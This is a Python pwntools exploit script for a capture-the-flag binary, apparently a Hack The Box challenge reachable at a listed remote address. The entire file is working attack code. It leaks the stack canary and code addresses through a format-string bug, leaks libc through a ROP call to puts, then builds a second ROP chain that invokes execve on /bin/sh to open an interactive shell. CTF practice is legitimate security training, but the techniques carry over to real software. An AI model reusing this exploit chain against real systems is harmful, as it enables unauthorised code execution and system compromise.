#!/usr/bin/env python
from pwn import *
from pprint import pprint

exe = context.binary = ELF('./what_does_the_f_say', checksec=True)
context.terminal = ['tmux', 'splitw', '-hb']

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return (gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw), ELF('/usr/lib/libc.so.6', checksec=False))
    if args.REMOTE:
        return (remote('139.59.182.187', 31562), ELF('./libc.so.6', checksec=False))
    else:
        return (process([exe.path] + argv, *a, **kw), ELF('/usr/lib/libc.so.6', checksec=False))

gdbscript = '''
break *warning+274
continue
'''.format(**locals())

canary_offset = 24
stack_offset_from_canary = 8

io, libc = start()
rop = ROP(exe)
rop_libc = ROP(libc)

# set rocks to lower than 20 to get access to the buffer overflow for n in range(7):
for n in range(7):
    io.recvuntil("2. Space food")
    io.sendline("2")
    io.recvuntil("3. Spacecream (7.90 s.rocks)")
    io.sendline("3")

# get to string format
io.sendline("1")
io.recvuntil("3. Deathstar(70.00 s.rocks)")
io.sendline("2")
io.recvuntil("Red or Green Kryptonite?")

# param 13 is the stack canary, param 15 can be used to calculate csu_init address
str_fmt_print_data = "%13$lu.%15$lu"
io.sendline(str_fmt_print_data)

io.recvline()

data = io.recvline().strip().split(b".")

io.recvuntil("You have less than 20 space rocks! Are you sure you want to buy it?")

canary_value = int(data[0])
log.info(f"Got stack canary value: {hex(canary_value)}")
canary = p64(canary_value)

csu_init = int(data[1]) + 0x116

ret = p64(csu_init + 92)
pop_rdi_ret = p64(csu_init + 91)

puts_plt_addr = csu_init - 0x830
base_addr = puts_plt_addr - exe.plt['puts']

puts_plt = p64(puts_plt_addr)
puts_got = p64(base_addr + exe.got['puts'])
warning  = p64(csu_init - 0x416)

payload_leak = b"".join([
    b"X" * canary_offset,
    canary,
    b"Z" * stack_offset_from_canary,
    pop_rdi_ret,
    puts_got,
    puts_plt,
    warning
])

io.sendline(payload_leak)

io.recvline()

data = io.recv(6).strip()

if not data.find(b"\x2a\x2a"):
    log.failure(f"Stack canary bypass failed: {data + io.recvline().strip()}")
    exit(1)

puts = u64(data.ljust(8, b"\x00"))
libc_addr = puts - libc.symbols['puts']

log.info(f"Got puts address in libc: {hex(puts)}")

execve = p64(libc_addr + libc.symbols['execve'])
bin_sh = p64(libc_addr + next(libc.search(b"/bin/sh")))

io.recvuntil("You have less than 20 space rocks! Are you sure you want to buy it?")

null = p64(0x00)

# find common gadgets in libc to craft syscall
pop_rdx_rbx_ret = p64(libc_addr + rop_libc.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0])
pop_rax_ret     = p64(libc_addr + rop_libc.find_gadget(['pop rax', 'ret'])[0])
pop_rsi_r15_ret = p64(base_addr + rop.find_gadget(['pop rsi', 'pop r15', 'ret'])[0])
syscall         = p64(libc_addr + rop_libc.find_gadget(['syscall'])[0])

payload_rce = b"".join([
    b"X" * canary_offset,
    canary,
    b"Z" * stack_offset_from_canary,

    #ret,

    pop_rax_ret,
    p64(59), # sys_execve

    pop_rdi_ret,
    bin_sh,

    pop_rsi_r15_ret,
    null,
    null,

    pop_rdx_rbx_ret,
    null,
    null,

    syscall
])

io.sendline(payload_rce)
io.recvline()

io.success("Should get a shell...")

io.interactive()

